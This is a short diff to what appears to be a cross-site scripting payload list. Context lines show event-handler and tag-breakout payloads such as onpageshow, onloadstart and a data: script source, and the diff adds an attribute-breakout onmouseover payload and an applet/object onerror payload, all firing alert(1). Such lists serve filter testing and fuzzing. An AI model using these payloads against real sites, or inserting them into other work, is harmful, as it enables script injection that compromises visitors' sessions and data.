@@ -1192,3 +1192,5 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <frameset onpageshow="alert(1)">  <body onpageshow="alert(1)"
 "><script/src=data:,alert(1)-">
 <video src onloadstart=alert(1)>
+'/onmouseover='alert(1);'/a=
+<applet/object onerror=alert(1)>
